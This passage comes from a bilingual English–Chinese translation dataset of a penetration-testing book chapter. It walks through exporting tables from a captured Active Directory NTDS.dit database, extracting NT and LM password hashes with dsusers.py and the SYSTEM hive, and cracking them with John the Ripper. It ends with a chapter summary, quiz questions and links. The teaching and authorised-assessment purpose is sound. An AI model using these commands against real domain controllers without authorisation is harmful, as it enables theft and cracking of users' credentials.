  - PREF_H1
  type: TYPE_NORMAL
  zh: make
- en: make install
  id: totrans-152
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: make install
- en: ldconfig
  id: totrans-153
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ldconfig
- en: If you’re looking at that command and thinking, *isn’t* **git** *already installed?*,
    then yes, but this command will update it. Keep in mind that you’ll need **pip**
    for Python 2, so install that with **apt-get install python-pip** if you haven’t
    already – then, run **python -m pip install pycrypto** to get the low-level crypto
    modules needed by **ntdsxtract**.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你看到这个命令并在想，*不是***git** *已经安装了吗?*，那么答案是，已经安装了，但是这个命令会更新它。请记住，你需要**pip**来支持Python
    2，如果还没有安装，可以使用**apt-get install python-pip**来安装——然后，运行**python -m pip install
    pycrypto**来获取**ntdsxtract**所需的低级加密模块。
- en: 'Once everything has been configured and ready to rock, you should be able to
    just fire off **esedbexport**. We’re going to tell the utility to export all of
    the tables inside the NTDS database. There are two tables in particular that we
    need for hash extraction:'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦一切配置完成并准备好，你应该能直接运行**esedbexport**。我们将告诉这个工具导出NTDS数据库中的所有表。特别有两个表是我们进行哈希提取所需要的：
- en: esedbexport -m tables ntds.dit
  id: totrans-156
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: esedbexport -m tables ntds.dit
- en: 'You’ll see the following output:'
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 你会看到以下输出：
- en: '![Figure 16.21 – Exporting the tables from our captured NTDS.dit file ](image/Figure_16.21_B17616.jpg)'
  id: totrans-158
  prefs: []
  type: TYPE_IMG
  zh: '![图16.21 – 从我们捕获的NTDS.dit文件中导出表](image/Figure_16.21_B17616.jpg)'
- en: Figure 16.21 – Exporting the tables from our captured NTDS.dit file
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.21 – 从我们捕获的NTDS.dit文件中导出表
- en: 'And now, the moment of truth. We can pass the data table and link table to
    the **dsusers** Python script, along with the location of the **SYSTEM** hive
    (which contains the **SYSKEY** key), and ask the script to nicely format our hashes
    into a cracker-friendly format:'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，真正的关键时刻到了。我们可以将数据表和链接表传递给**dsusers** Python脚本，同时提供**SYSTEM** hive的位置（它包含**SYSKEY**密钥），并让脚本将哈希值以易于破解的格式优雅地格式化：
- en: cd ntdsxtract
  id: totrans-161
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: cd ntdsxtract
- en: python dsusers.py /root/ntds/ntds.dit.export/datatable /root/ntds/ntds.dit.export/link_table
    /root/ntds --syshive /root/ntds/SYSTEM --passwordhashes --lmoutfile /root/ntds/lm.txt
    --ntoutfile /root/ntds/nt.txt --pwdformat ophc
  id: totrans-162
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: python dsusers.py /root/ntds/ntds.dit.export/datatable /root/ntds/ntds.dit.export/link_table
    /root/ntds --syshive /root/ntds/SYSTEM --passwordhashes --lmoutfile /root/ntds/lm.txt
    --ntoutfile /root/ntds/nt.txt --pwdformat ophc
- en: 'I encourage you to study the actual database contents for things such as password
    history. This information allowed me to maximize the impact of my findings on
    clients. Why would I need to do that? Because organizations with aggressive password
    change policies, such as 45 days, will sometimes try to argue that none of my
    hashes are valid. And sometimes, they’re right. Check the histories; the ones
    where the user who just logged in the day before the assessment are probably using
    the same password:'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 我鼓励你研究实际数据库中的内容，了解诸如密码历史等信息。这些信息帮助我最大限度地提高了我的发现对客户的影响。为什么我要这么做呢？因为有些组织采取较为严格的密码更换政策，例如45天，会有时尝试争辩说我的哈希值都不合法。有时候，他们确实是对的。查看密码历史记录；那些在评估前一天刚登录的用户，可能仍在使用相同的密码：
- en: '![Figure 16.22 – Extracted domain records ](image/Figure_16.22_B17616.jpg)'
  id: totrans-164
  prefs: []
  type: TYPE_IMG
  zh: '![图16.22 – 提取的域记录](image/Figure_16.22_B17616.jpg)'
- en: Figure 16.22 – Extracted domain records
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.22 – 提取的域记录
- en: 'John knows what to do with the formatted text files. As you can see, I recovered
    one of my passwords in about 30 seconds when I passed the **john --fork=2 nt.txt**
    command:'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: John知道如何处理格式化的文本文件。正如你所见，我在大约30秒内恢复了我的一个密码，当我执行了**john --fork=2 nt.txt**命令时：
- en: '![Figure 16.23 – John successfully recovering a password ](image/Figure_16.23_B17616.jpg)'
  id: totrans-167
  prefs: []
  type: TYPE_IMG
  zh: '![图16.23 – John 成功恢复密码](image/Figure_16.23_B17616.jpg)'
- en: Figure 16.23 – John successfully recovering a password
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.23 – John 成功恢复密码
- en: Some environments will yield thousands of hashes. Even John running on a humble
    CPU will start cracking the low-hanging fruit very quickly. Another area to consider
    for offline research is GPU cracking, which leverages the FLOPS of a graphics
    processor to crack passwords at wild rates. Especially on shorter assessments,
    it can make a tremendous difference.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 一些环境会生成数千个哈希值。即使是运行在普通CPU上的John，也能非常快速地破解那些简单的密码。另一个值得考虑的离线研究领域是GPU破解，它利用图形处理器的FLOPS来以极快的速度破解密码，尤其是在较短的评估中，这可能带来巨大的差异。
- en: Summary
  id: totrans-170
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we looked behind the scenes at some basic privilege escalation
    techniques. We reviewed how Metasploit accomplishes this automatically, but also
    how it may be possible with local exploits. We did a quick review of the post
    phase with Armitage and revisited pivoting. We reviewed PowerShell Empire and
    created stealthy agents with remote WMI commands. Then, we looked at using an
    Empire module to steal access tokens while reviewing the underlying concept. Finally,
    we explored a technique for extracting hashes from a domain controller by exploiting
    built-in backup mechanisms. Overall, we demonstrated several attacks that employed
    functionality that is built into Windows, increasing our stealth and providing
    useful configuration recommendations for the client.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们深入了解了一些基本的特权提升技术。我们回顾了Metasploit是如何自动完成这一过程的，也探讨了使用本地漏洞实现这一目标的可能性。我们快速回顾了与Armitage的后期阶段，并重新审视了pivoting（跳跃）。我们回顾了PowerShell
    Empire，并通过远程WMI命令创建了隐秘的代理。接着，我们利用Empire模块窃取访问令牌，并复习了其背后的基本概念。最后，我们探索了通过利用内建备份机制从域控制器提取哈希值的技术。总体来说，我们展示了几种利用Windows内建功能进行的攻击，增加了我们的隐蔽性，并为客户提供了有用的配置建议。
- en: In the final chapter, we’ll be looking at persistence – techniques that allow
    our established access to persist through reboots and reconfiguration. With a
    foundation in maintaining our access, we allow ourselves time to gather as much
    information as possible, hence increasing the value of the assessment for the
    client.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 在最后一章，我们将讨论持久性——那些允许我们在重启和重新配置后保持访问权限的技术。通过建立持久访问的基础，我们可以为自己争取更多时间收集尽可能多的信息，从而提升对客户的评估价值。
- en: Questions
  id: totrans-173
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: 'Answer the following questions to test your knowledge of this chapter:'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 回答以下问题以测试你对本章内容的理解：
- en: Named pipes are also known as _____ in Unix-like systems.
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 命名管道在类Unix系统中也被称为_____。
- en: An ASCII character is always 8 bits long, whereas a WCHAR character is always
    16 bits long. (True | False)
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一个ASCII字符总是8位长，而一个WCHAR字符总是16位长。（正确 | 错误）
- en: What does WMI stand for?
  id: totrans-177
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: WMI代表什么？
- en: What does IPC stand for?
  id: totrans-178
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: IPC代表什么？
- en: In addition to a returned error code, a successful remote WMI process call will
    also return the _____, which you can then use to verify your agent’s context.
  id: totrans-179
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 除了返回的错误代码，成功的远程WMI进程调用还将返回_____，你可以利用它来验证你的代理上下文。
- en: Shadow copies are copies of what?
  id: totrans-180
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Shadow副本是哪些内容的副本？
- en: What’s the crucial piece of information contained in the **SYSTEM** hive for
    extracting hashes from the NTDS database?
  id: totrans-181
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 提取NTDS数据库中的哈希值时，**SYSTEM**注册表项中包含的关键信息是什么？
- en: Further reading
  id: totrans-182
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 深入阅读
- en: 'For more information regarding the topics that were covered in this chapter,
    take a look at the following resources:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 想要了解更多关于本章内容的资料，请查阅以下资源：
- en: Named pipe documentation: [https://docs.microsoft.com/en-us/windows/desktop/ipc/named-pipes](https://docs.microsoft.com/en-us/windows/desktop/ipc/named-pipes%0D)
  id: totrans-184
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 命名管道文档：[https://docs.microsoft.com/en-us/windows/desktop/ipc/named-pipes](https://docs.microsoft.com/en-us/windows/desktop/ipc/named-pipes%0D)
- en: WMI reference documentation: [https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-reference](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-reference)
  id: totrans-185
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: WMI参考文档：[https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-reference](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-reference)
